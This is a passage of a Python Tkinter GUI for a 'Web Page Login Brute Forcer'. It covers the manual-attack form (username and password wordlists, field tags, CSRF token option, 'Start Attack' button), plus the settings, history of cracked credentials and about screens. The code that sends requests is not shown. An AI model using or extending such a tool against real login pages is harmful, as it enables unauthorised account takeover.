            usersNameList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            username_Select_BTN.config(text="Select")
            usersNameList_EntryVAR.set("")
            userName_msglabel.config(text='Please select an user name list')
        userNameList_Entry.xview_moveto(1)

    miscellaneousFrame2 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame2.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame2,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame2,text="Username List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()
    userNameListSelection_Frame=Frame(frame_for_adding_stuff,bg=main_Background,padx=6)

    userNameListSelection_Frame.pack()

    Label(userNameListSelection_Frame,text="    ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    userNameSelect_hscrollbar = Scrollbar(userNameListSelection_Frame, orient=HORIZONTAL)
    userNameSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    userNameList_Entry = Entry(userNameListSelection_Frame,cursor='',font=("century",13),textvariable=usersNameList_EntryVAR,xscrollcommand=userNameSelect_hscrollbar.set,width=36,state=DISABLED)
    userNameList_Entry.pack(side=LEFT)

    userNameSelect_hscrollbar.config(command=userNameList_Entry.xview)

    Label(userNameListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    username_Select_BTN = Button(userNameListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_users_file)
    username_Select_BTN.pack(side=RIGHT)

    userName_msglabel= Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    userName_msglabel.pack()


    #Select Passwords

    def choose_password_file():
        global text_Filename
        Password_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            Password_Select_BTN.config(text="Change")
            PasswordList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            Password_Select_BTN.config(text="Select")
            PasswordList_EntryVAR.set("")
            Password_msglabel.config(text='Please select a password list')
        PasswordList_Entry.xview_moveto(1)

    miscellaneousFrame3 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame3.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame3,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame3,text="Password List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()
    PasswordListSelection_Frame=Frame(frame_for_adding_stuff,bg=main_Background)

    PasswordListSelection_Frame.pack(padx=6)

    Label(PasswordListSelection_Frame,text="    ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    PasswordSelect_hscrollbar = Scrollbar(PasswordListSelection_Frame, orient=HORIZONTAL)
    PasswordSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    PasswordList_Entry = Entry(PasswordListSelection_Frame,cursor='',font=("century",13),textvariable=PasswordList_EntryVAR,xscrollcommand=PasswordSelect_hscrollbar.set,width=36,state=DISABLED)
    PasswordList_Entry.pack(side=LEFT)

    PasswordSelect_hscrollbar.config(command=PasswordList_Entry.xview)

    Label(PasswordListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Password_Select_BTN = Button(PasswordListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_password_file)
    Password_Select_BTN.pack(side=RIGHT)

    Password_msglabel= Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    Password_msglabel.pack()

    def on_userName_Tag_entry_click(event):
        if UserName_TAG_EntryVAR.get() == UserName_TAG_EntryVAR_Default:
            UserName_TAG_Entry.delete(0, "end") # delete all the text in the entry
            UserName_TAG_Entry.insert(0, '') #Insert blank for user input
            UserName_TAG_Entry.config(fg = 'black',font=("century",13))
        UserName_TAG_msglabel.config(text='')

    def on_userName_Tag_entry_focusout(event):
        if UserName_TAG_EntryVAR.get() != UserName_TAG_EntryVAR_Default or UserName_TAG_EntryVAR.get() !='':
            UserName_TAG_Entry.config(fg = 'black',font=("century",13))
        if UserName_TAG_Entry.get() == '' or UserName_TAG_EntryVAR.get() == UserName_TAG_EntryVAR_Default:
            UserName_TAG_EntryVAR.set(UserName_TAG_EntryVAR_Default)
            UserName_TAG_Entry.config(fg = 'grey',font=("Comic Sans MS",11))
            UserName_TAG_msglabel.config(text='Please input user name tag')

    miscellaneousFrame4 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame4.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame4,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame4,text="Username Tag",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()
    Username_TAG_Selection_Frame=Frame(frame_for_adding_stuff,bg=main_Background)

    Username_TAG_Selection_Frame.pack(padx=6)

    UserName_TAG_Entry = Entry(Username_TAG_Selection_Frame,cursor='',fg = 'grey',font=("Comic Sans MS",11),textvariable=UserName_TAG_EntryVAR,width=43)
    UserName_TAG_Entry.bind('<FocusIn>', on_userName_Tag_entry_click)
    UserName_TAG_Entry.bind('<FocusOut>', on_userName_Tag_entry_focusout)
    UserName_TAG_Entry.pack(side=LEFT,anchor=W)

    UserName_TAG_msglabel= Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    UserName_TAG_msglabel.pack()



    def on_Password_Tag_entry_click(event):
        if Password_TAG_EntryVAR.get() == Password_TAG_EntryVAR_Default:
            Password_TAG_Entry.delete(0, "end") # delete all the text in the entry
            Password_TAG_Entry.insert(0, '') #Insert blank for user input
            Password_TAG_Entry.config(fg = 'black',font=("century",13))
        Password_TAG_msglabel.config(text='')

    def on_Password_Tag_entry_focusout(event):
        if Password_TAG_EntryVAR.get() != Password_TAG_EntryVAR_Default or Password_TAG_EntryVAR.get() !='':
            Password_TAG_Entry.config(fg = 'black',font=("century",13))
        if Password_TAG_Entry.get() == '' or Password_TAG_EntryVAR.get() == Password_TAG_EntryVAR_Default:
            Password_TAG_EntryVAR.set(Password_TAG_EntryVAR_Default)
            Password_TAG_Entry.config(fg = 'grey',font=("Comic Sans MS",11))
            Password_TAG_msglabel.config(text='Please input password tag')

    miscellaneousFrame5 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame5.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame5,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame5,text="Password Tag",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()
    Password_TAG_Selection_Frame=Frame(frame_for_adding_stuff,bg=main_Background)

    Password_TAG_Selection_Frame.pack(padx=6)

    Password_TAG_Entry = Entry(Password_TAG_Selection_Frame,cursor='',fg = 'grey',font=("Comic Sans MS",11),textvariable=Password_TAG_EntryVAR,width=43)
    Password_TAG_Entry.bind('<FocusIn>', on_Password_Tag_entry_click)
    Password_TAG_Entry.bind('<FocusOut>', on_Password_Tag_entry_focusout)
    Password_TAG_Entry.pack(side=LEFT,anchor=W)

    Password_TAG_msglabel= Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    Password_TAG_msglabel.pack()


    miscellaneousFrame6 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame6.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame6,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame6,text="CSRF Token Tag",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()

    Label(frame_for_adding_stuff,text="Is the website use CSRF Token ?",font=("aller",14),bg=main_Background).pack()

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()

    miscellaneousFrame7 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame7.pack(side=TOP)

    def radioButton_FUNCTION():
        if radiobutton_VAR.get() == 1:
            CSRF_TAG_Entry.config(state=NORMAL)
        elif radiobutton_VAR.get() == 2:
            CSRF_TAG_Entry.delete(0, "end")
            CSRF_TAG_EntryVAR.set(CSRF_TAG_EntryVAR_Default)
            CSRF_TAG_Entry.config(fg = 'grey',font=("Comic Sans MS",11),state=DISABLED)
            CSRF_TAG_msglabel.config(text='')
            CSRF_TAG_msglabel.focus_set()

    def on_CSRF_TAG_Entry_click(event):
        if CSRF_TAG_EntryVAR.get() == CSRF_TAG_EntryVAR_Default:
            CSRF_TAG_Entry.delete(0, "end") # delete all the text in the entry
            CSRF_TAG_Entry.insert(0, '') #Insert blank for user input
            CSRF_TAG_Entry.config(fg = 'black',font=("century",13))
        CSRF_TAG_msglabel.config(text='')

    def on_CSRF_TAG_Entry_focusout(event):
        if CSRF_TAG_EntryVAR.get() != CSRF_TAG_EntryVAR_Default or CSRF_TAG_EntryVAR.get() !='':
            CSRF_TAG_Entry.config(fg = 'black',font=("century",13))
        if CSRF_TAG_Entry.get() == '' or CSRF_TAG_EntryVAR.get() == CSRF_TAG_EntryVAR_Default:
            CSRF_TAG_EntryVAR.set(CSRF_TAG_EntryVAR_Default)
            CSRF_TAG_Entry.config(fg = 'grey',font=("Comic Sans MS",11))
            if radiobutton_VAR.get() != 2:
                if radiobutton_VAR.get() != 0:
                    CSRF_TAG_msglabel.config(text='Please input CSRF tag')

    def restBTN_FUN():
        CSRF_TAG_msglabel.focus_set()
        clearWidgets('clear_data')
        CSRF_TAG_EntryVAR.set(CSRF_TAG_EntryVAR_Default)
        CSRF_TAG_Entry.config(fg = 'grey',font=("Comic Sans MS",11),state=DISABLED)
        CSRF_TAG_msglabel.config(text='')

    R1 = Radiobutton(miscellaneousFrame7,font=("aller",12),bg=main_Background,activebackground=main_Background, variable=radiobutton_VAR, value=1, text="Yes",command=radioButton_FUNCTION)
    R1.pack(side=LEFT,padx=12)

    R2 = Radiobutton(miscellaneousFrame7,font=("aller",12),bg=main_Background,activebackground=main_Background, variable=radiobutton_VAR, value=2, text="No",command=radioButton_FUNCTION)
    R2.pack(side=RIGHT,padx=12)

    Label(frame_for_adding_stuff,text="  ",font=("arial",1),bg=main_Background).pack()

    miscellaneousFrame8 = Frame(frame_for_adding_stuff,bg=main_Background)
    miscellaneousFrame8.pack(side=TOP)

    CSRF_TAG_Selection_Frame=Frame(frame_for_adding_stuff,bg=main_Background)
    CSRF_TAG_Selection_Frame.pack(padx=6)

    CSRF_TAG_Entry = Entry(CSRF_TAG_Selection_Frame,disabledbackground=main_Background,cursor='',fg = 'grey',font=("Comic Sans MS",11),textvariable=CSRF_TAG_EntryVAR,width=43,state=DISABLED)
    CSRF_TAG_Entry.bind('<FocusIn>', on_CSRF_TAG_Entry_click)
    CSRF_TAG_Entry.bind('<FocusOut>', on_CSRF_TAG_Entry_focusout)
    CSRF_TAG_Entry.pack(side=LEFT,anchor=W)

    CSRF_TAG_msglabel= Label(frame_for_adding_stuff,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    CSRF_TAG_msglabel.pack()

    #Bottom Button Frame

    bottomBTN_Frame = Frame(frame_for_adding_stuff,bg=main_Background)
    bottomBTN_Frame.pack(side=BOTTOM,anchor=E,padx=12)

    Button(bottomBTN_Frame,text='Reset',font=('Lobster 1.3',12),bg=r_BTN_BG_COLOR,highlightthickness=3,activebackground=r_BTN_BG_COLOR,command=restBTN_FUN).pack(side=LEFT,padx=4,pady=8)
    Button(bottomBTN_Frame,text='Start Attack',font=('Lobster 1.3',12),bg=s_BTN_BG_COLOR,highlightthickness=3,activebackground=s_BTN_BG_COLOR,command=preCheckInputs_Before_manualAttack).pack(side=RIGHT,padx=4)


#Load setting frame
def loadSettingFrame(x):
    global possible_error_messages, possible_success_messages, theme_value, th_value
    #temp variables for settings values backup  
    temp_error = possible_error_messages
    temp_sus = possible_success_messages
    temp_theme = theme_value
    temp_thread = th_value

    #default success and error list
    if default_Error == temp_error or temp_error == 'ErrorList.txt':
        temp_error = os.path.basename(temp_error)
    if default_Sussess == temp_sus or temp_sus ==  'SussessList.txt':
        temp_sus = os.path.basename(temp_sus)


    if x == 'self':
        clearWidgets('clear_widget')
    elif x != 'self':
        clearWidgets('clear_all')
        successList_EntryVAR.set(temp_sus)
        errorList_EntryVAR.set(temp_error)
    center_window(mainWindow,435, 420)
    mainWindow.config(bg=main_Background)
    mainWindow.title("Login Page Brute Forcer - Settings")

    back_btn = Button(mainWindow,image=back_ICON,relief=GROOVE,bd=0,bg=main_Background,activebackground=main_Background)
    back_btn.pack(side=TOP,anchor=W,padx=15,pady=6)

    #Select Possible Success List
    def choose_users_file():
        global text_Filename
        successList_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            success_Select_BTN.config(text="Change")
            successList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            success_Select_BTN.config(text="Select")
            successList_EntryVAR.set("SussessList.txt")
            successList_msglabel.config(text='Please select an user name list')
        successListList_Entry.xview_moveto(1)

    miscellaneousFrame = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame,text="Possible Success Message List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(mainWindow,text="   ",font=("arial",1),bg=main_Background).pack()
    successListSelection_Frame=Frame(mainWindow,bg=main_Background)

    successListSelection_Frame.pack()

    Label(successListSelection_Frame,text=" ",font=("arial",1),bg=main_Background).pack(side=LEFT)
    successSelect_hscrollbar = Scrollbar(successListSelection_Frame, orient=HORIZONTAL)
    successSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    successListList_Entry = Entry(successListSelection_Frame,cursor='',font=("century",13),textvariable=successList_EntryVAR,xscrollcommand=successSelect_hscrollbar.set,width=36,state=DISABLED)
    successListList_Entry.pack(side=LEFT)

    successSelect_hscrollbar.config(command=successListList_Entry.xview)

    Label(successListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    success_Select_BTN = Button(successListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_users_file)
    success_Select_BTN.pack(side=RIGHT)

    successList_msglabel= Label(mainWindow,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    successList_msglabel.pack()


    #Select errorLists

    def choose_errorList_file():
        global text_Filename
        errorList_msglabel.config(text='')
        text_Filename = filedialog.askopenfilename(title = "Select Text File",filetypes = (('text files', '*.txt'),))
        filename_con = text_Filename.replace('/', '\\')
        if  filename_con != "":
            errorList_Select_BTN.config(text="Change")
            errorList_EntryVAR.set(filename_con)
        elif  filename_con == "":
            errorList_Select_BTN.config(text="Select")
            errorList_EntryVAR.set("ErrorList.txt")
            errorList_msglabel.config(text='Please select a error list')
        errorList_Entry.xview_moveto(1)

    miscellaneousFrame2 = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame2.pack(side=TOP,anchor=W)

    Label(miscellaneousFrame2,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame2,text="Possible Error Message List",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(mainWindow,text="   ",font=("arial",1),bg=main_Background).pack()
    errorListSelection_Frame=Frame(mainWindow,bg=main_Background)

    errorListSelection_Frame.pack()

    Label(errorListSelection_Frame,text=" ",font=("arial",1),bg=main_Background).pack(side=LEFT)
    errorListSelect_hscrollbar = Scrollbar(errorListSelection_Frame, orient=HORIZONTAL)
    errorListSelect_hscrollbar.pack(side=BOTTOM,fill=BOTH)

    errorList_Entry = Entry(errorListSelection_Frame,cursor='',font=("century",13),textvariable=errorList_EntryVAR,xscrollcommand=errorListSelect_hscrollbar.set,width=36,state=DISABLED)
    errorList_Entry.pack(side=LEFT)

    errorListSelect_hscrollbar.config(command=errorList_Entry.xview)

    Label(errorListSelection_Frame,text="      ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    errorList_Select_BTN = Button(errorListSelection_Frame,text="Select",font=("arial",12),width=6,height=1,command=choose_errorList_file)
    errorList_Select_BTN.pack(side=RIGHT)

    errorList_msglabel= Label(mainWindow,text="",font=('century',10,BOLD),fg='#ff4747',bg=main_Background)
    errorList_msglabel.pack()


    miscellaneousFrame3 = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame3.pack(side=TOP,anchor=W,fill=X)

    Label(miscellaneousFrame3,text="          ",font=("arial",4),bg=main_Background).pack(side=LEFT)
    Label(miscellaneousFrame3,text="Theme",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=LEFT)

    Label(miscellaneousFrame3,text="Threading Limit",font=("Calisto MT",14,BOLD),relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2).pack(side=RIGHT,padx=11)

    def color_function():
        value = Checkbutton_VAR.get()
        if value == 0:
            select_colors()
            loadSettingFrame('self')
        elif value == 1:
            select_colors()
            loadSettingFrame('self')

    miscellaneousFrame4 = Frame(mainWindow,bg=main_Background)
    miscellaneousFrame4.pack(side=TOP,anchor=W,fill=X)
    Label(miscellaneousFrame4,text="       ",font=("arial",4),bg=main_Background).pack()
    R1 = Checkbutton(miscellaneousFrame4,image=light_ICON ,variable=Checkbutton_VAR, onvalue=0, offvalue=1,bg=main_Background,activebackground=main_Background, text="Light",command=color_function)
    R1.pack(side=LEFT,padx=14)

    R2 = Checkbutton(miscellaneousFrame4,image=dark_ICON, variable=Checkbutton_VAR, onvalue=1, offvalue=0,bg=main_Background,activebackground=main_Background, text="Dark",command=color_function)
    R2.pack(side=LEFT,padx=2)


    th_SCALE = Scale(miscellaneousFrame4,bg=main_Background,highlightbackground=main_Background, troughcolor=scale_color ,variable = th_value_VAR, from_ = 5, to = 10, orient = HORIZONTAL,length=142)
    th_SCALE.pack(side=RIGHT,padx=16)

    Label(mainWindow,text="          ",font=("arial",7),bg=main_Background).pack()

    successListList_Entry.xview_moveto(1)
    errorList_Entry.xview_moveto(1)

    #rest data on back or reset btn click   
    def rest_BTN(val):
        global possible_error_messages, possible_success_messages, theme_value, th_value
        
        
        if val == 'rest':
            conn = sqlite3.connect(APPDATA_Database_DB)
            conn.execute("insert into Settings (error_list,success_list,default_theme,default_thread_limit) values (?, ?, ?, ?)",
            ('ErrorList.txt', 'SussessList.txt', 0, 7))
            conn.commit()
            conn.close()
            possible_error_messages = 'ErrorList.txt' 
            possible_success_messages = 'SussessList.txt'
            theme_value = 0
            th_value = 7
            
            errorList_EntryVAR.set(default_Error)
            successList_EntryVAR.set(default_Sussess)
            Checkbutton_VAR.set(default_theme_value)
            th_value_VAR.set(default_threading_value)
            select_colors()
            loadSettingFrame('self')
            return

        if val == 'home':
            errorList_EntryVAR.set(temp_error)
            successList_EntryVAR.set(temp_sus)
            Checkbutton_VAR.set(temp_theme)
            th_value_VAR.set(temp_thread)
            possible_error_messages = temp_error
            possible_success_messages = temp_sus
            th_value = temp_thread
            theme_value = temp_theme
            select_colors()
            loadHomeScreen()
        else:
            errorList_EntryVAR.set(default_Error)
            successList_EntryVAR.set(default_Sussess)
            Checkbutton_VAR.set(default_theme_value)
            th_value_VAR.set(default_threading_value)

            possible_error_messages = default_Error
            possible_success_messages = default_Sussess
            th_value = default_threading_value
            theme_value = default_threading_value
            select_colors()
            loadSettingFrame('self')

    #Save button fun
    def save_update_DB():
        global possible_error_messages, possible_success_messages, theme_value, th_value
        val1 = str(successList_EntryVAR.get())
        val2 = str(errorList_EntryVAR.get())
        val3 = int(Checkbutton_VAR.get())
        val4 = int(th_value_VAR.get())
        if  Validate_files(val1) == True and Validate_files(val2) == True:
            pass
        elif val2 == 'ErrorList.txt':
            pass
        elif val1 ==  'SussessList.txt': 
            pass
        conn = sqlite3.connect(APPDATA_Database_DB)
        conn.execute("insert into Settings (error_list,success_list,default_theme,default_thread_limit) values (?, ?, ?, ?)",
            (val2, val1, val3, val4))
        #Create histroy table letter
        conn.commit()
        conn.close()
        possible_error_messages = val2
        possible_success_messages = val1
        th_value = val4
        theme_value = val3
        loadSettingFrame('self')



    back_btn.config(command=lambda:rest_BTN('home'))

    #Bottom Button Frame
    bottomBTN_Frame = Frame(mainWindow,bg=main_Background)
    bottomBTN_Frame.pack(side=BOTTOM,anchor=E,padx=12)

    Button(bottomBTN_Frame,text='Set Default',font=('Lobster 1.3',12),bg=r_BTN_BG_COLOR,highlightthickness=3,activebackground=r_BTN_BG_COLOR,command=lambda:rest_BTN('rest')).pack(side=LEFT,padx=6,pady=7)
    Button(bottomBTN_Frame,text='Save',font=('Lobster 1.3',12),bg=s_BTN_BG_COLOR,highlightthickness=3,activebackground=s_BTN_BG_COLOR,command=save_update_DB).pack(side=RIGHT,pady=7)

#About Frame
def show_about():   
    clearWidgets('clear_widget')
    center_window(mainWindow,690,420)
    mainWindow.config(background=main_Background)
    mainWindow.title("Login Page Brute Forcer - About")
    test_frame = Frame(mainWindow,bg=main_Background)
    Button(test_frame,image=back_ICON,relief=GROOVE,bd=0,bg=main_Background,activebackground=main_Background,command=loadHomeScreen).place(x=9,y=8)
    test_frame.pack(fill=BOTH,expand=True)


    head_frame = Frame(test_frame,bd=5,relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2)
    head_frame.pack(pady=8)
    Label(head_frame,text='  Web Site Login Page Burt Forcer  ',font=('Intro Rust G Base 2 Line',22),bg=Banner_Colour_1).pack(side=TOP)
    body_frame = Frame(mainWindow)
    body_frame.pack()


    about_frame = Frame(body_frame,bg='white')
    about_frame.pack(fill=BOTH,expand=1)

    about_Canvas = Canvas(about_frame,bg='white',highlightcolor=main_Background,highlightbackground=main_Background,width=526)
    about_Canvas.pack(side=LEFT,fill=BOTH,expand=1)

    canvas_vbar = ttk.Scrollbar(about_frame,orient=VERTICAL,command=about_Canvas.yview)
    canvas_vbar.pack(side=RIGHT,fill=Y)


    about_Canvas.configure(yscrollcommand=canvas_vbar.set)
    about_Canvas.bind('<Configure>',lambda e:about_Canvas.configure(scrollregion=about_Canvas.bbox("all")))


    frame_for_adding_stuff = Frame(about_Canvas,bg=main_Background)

    about_Canvas.create_window((0,0),window=frame_for_adding_stuff,anchor=NW)
    About_msg = "               Webpage Login Brute Forces is a python Tkinter-GUI based easy to use tool. It have two modes:-\n                                    i)Autometed          ii)Manual\n\n               In Autometed mode it takes targeted URL, possible username list as a text file and possible password list as a text file.It will scan targeted webpage and scrap all the important tags and try to Brute Force them, it also trying to Brute Force CSRF token (if present).\n\n              In Manual mode it takes target URL, possible username list as text, possible password list as text, username tag, password tag, CSRF token tag (if available). It will Brute Force the given tags with the help of given credential's.\n\n               All the successfull Brute Force Attack Credentials will be stored, you can show them in 'History' section, also if you want you can delete them as well.\n\n               In 'Settings' section you can change the 'Success Message List' and 'Error Message List'. You can change Thread Limit of Brute Force attack (default is 7). Theme of\nthe app can be changed between 'Light Theme' and 'Dark Theme' in settings section."
    Label(frame_for_adding_stuff,text=About_msg,font=('Intro Script R H2 Base',17),justify= LEFT,wraplength=537,background='white').pack()

    about_footer_frame=Frame(mainWindow,bg=main_Background)
    about_footer_frame.pack()

    Button(about_footer_frame,image=git_ICON,background='#e2e2e2',command=lambda:(webbrowser.open('github.com/Hrishikesh7665', new=0, autoraise=True))).pack(side=LEFT,padx=6,pady=10)
    Button(about_footer_frame,image=hack_ICON,background='#e2e2e2',command=lambda:(webbrowser.open('https://www.hackerrank.com/Hrishikesh7665', new=0, autoraise=True))).pack(side=RIGHT,padx=6,pady=10)

#History Frame
def show_History():   
    clearWidgets('clear_widget')
    center_window(mainWindow,720,420)
    mainWindow.title("Login Page Brute Forcer - History")

    back_btn = Button(mainWindow,image=back_ICON,relief=GROOVE,bd=0,bg=main_Background,activebackground=main_Background,command=loadHomeScreen)
    back_btn.pack(side=TOP,anchor=W,padx=15,pady=6)

    table_frame=Frame(mainWindow)
    table_frame.pack(fill=BOTH,expand=True)

    scrollbar_menu_x = Scrollbar(table_frame,orient=HORIZONTAL)
    scrollbar_menu_y = Scrollbar(table_frame,orient=VERTICAL)

    s = ttk.Style(table_frame)
    s.configure("Treeview.Heading",font=("arial",13, "bold"))
    s.configure("Treeview",font=("arial",12),rowheight=25)

    history_table = ttk.Treeview(table_frame,style = "Treeview",
                columns =("no", "timestamp", "URL", "UName", "password"),xscrollcommand=scrollbar_menu_x.set,
                yscrollcommand=scrollbar_menu_y.set)

    history_table.heading("no",text="No")
    history_table.heading("timestamp",text="Date-Time")
    history_table.heading("URL",text="URL")
    history_table.heading("UName",text="User Name")
    history_table.heading("password",text="Password")


    history_table["displaycolumns"]=("no", "timestamp", "URL", "UName", "password")
    history_table["show"] = "headings"


    history_table.column("no",width=30,anchor='center',stretch=NO)
    history_table.column("timestamp",width=50,anchor='center')
    history_table.column("URL",width=400,anchor='center')
    history_table.column("UName",width=60,anchor='center')
    history_table.column("password",width=60,anchor='center')

    scrollbar_menu_x.pack(side=BOTTOM,fill=X)
    scrollbar_menu_y.pack(side=RIGHT,fill=Y)

    scrollbar_menu_x.configure(command=history_table.xview)
    scrollbar_menu_y.configure(command=history_table.yview)

    history_table.pack(fill=BOTH,expand=1)

    conn = sqlite3.connect(APPDATA_Database_DB)
    c = conn.cursor()

    c.execute("SELECT * FROM History")
    history_table.delete(*history_table.get_children())
    items = c.fetchall()
    i = 0
    for items in items:
        i = i+1
        num = i
        time_date = (items[0])
        web_url = (items[1])
        username = (items[2])
        user_password = (items[3])
        history_table.insert('',END,values=[num,time_date,web_url,username,user_password])
    conn.close()
    
    def selectItem():
        curItem = (history_table.focus())
        data = history_table.item(curItem)
        data = data.get('values')
        num = data[0]
        data = str(data[1])
        n = num-1
        selected_item = history_table.get_children()[n]
        history_table.delete(selected_item)
        conn = sqlite3.connect(APPDATA_Database_DB)
        cur = conn.cursor()
        sql = 'DELETE FROM History WHERE time_date=?'
        cur.execute(sql, (data,))
        conn.commit()

    Button(mainWindow,text='Delete',command=selectItem).pack(side=RIGHT,padx=15,pady=5)

#Wellcome Frame
def  loadHomeScreen():
    clearWidgets('clear_all')
    center_window(mainWindow,365, 405)
    mainWindow.title("Login Page Brute Forcer")
    mainWindow.config(bg=main_Background)
    homeFrame = Frame(mainWindow,bg=main_Background)
    homeFrame.pack()

    def keep_flat(event):       # on click,
        if event.widget is dev_b: # if the click came from the button
            event.widget.config(relief=FLAT) # enforce an option

    def dev_b_on_enter(e):
        dev_b.config(foreground= "blue")

    def dev_b_on_leave(e):
        dev_b.config(foreground= 'black')

    home_banner_Frame = Frame(homeFrame,bd=5,relief=RAISED,bg=Banner_Colour_1,highlightthickness=3,highlightbackground=Banner_Colour_2)

    Label(homeFrame,text=" ",font=("arial",2),bg=main_Background).pack()

    Label(home_banner_Frame,text=" ",font=("elephant",1,ITALIC),bg=Banner_Colour_1).pack()
    Home_Banner = Label(home_banner_Frame,text="Web Page Login \nBrute Forcer",font=("elephant",28,ITALIC,UNDERLINE),bg=Banner_Colour_1)
    Home_Banner.pack()
    Label(home_banner_Frame,text=" ",font=("arial",2),bg=Banner_Colour_1).pack()
    home_banner_Frame.pack()
    Label(homeFrame,text="\n",font=("arial",2),bg=main_Background).pack()

    Button(homeFrame,text="Autometed",font=("Lucida Bright",14,BOLD,ITALIC),width=11,command=loadAutometedFrame).pack(pady=5)
    Button(homeFrame,text="Manual",font=("Lucida Bright",14,BOLD,ITALIC),width=11,command=loadManualFrame).pack(pady=8)
    Button(homeFrame,text="History",font=("Lucida Bright",14,BOLD,ITALIC),width=11,command=show_History).pack(pady=8)
    Button(homeFrame,text="Settings",font=("Lucida Bright",14,BOLD,ITALIC),width=11,command=lambda:loadSettingFrame(None)).pack(pady=5)
    Button(homeFrame,image=info_ICON,background=main_Background,relief=FLAT,command=show_about).pack(side=LEFT)
    Button(homeFrame,image=exit_ICON,background=main_Background,command=exit_CON,relief=FLAT).pack(side=RIGHT)
    dev_b = Button(homeFrame,text='Developed By Hrishikesh Patra',font=('',8),background=main_Background,command=lambda:(webbrowser.open('github.com/Hrishikesh7665', new=0, autoraise=True)),relief=FLAT,activebackground=main_Background)
    dev_b.pack(side=BOTTOM,anchor=N)
    dev_b.bind('<Enter>', dev_b_on_enter)
    dev_b.bind('<Leave>', dev_b_on_leave)
    mainWindow.bind('<Button-1>', keep_flat)

select_colors()
loadHomeScreen()

mainWindow.title("Login Page Brute Forcer")
mainWindow.resizable(FALSE,FALSE)
mainWindow.protocol("WM_DELETE_WINDOW", exit_CON)
mainWindow.mainloop()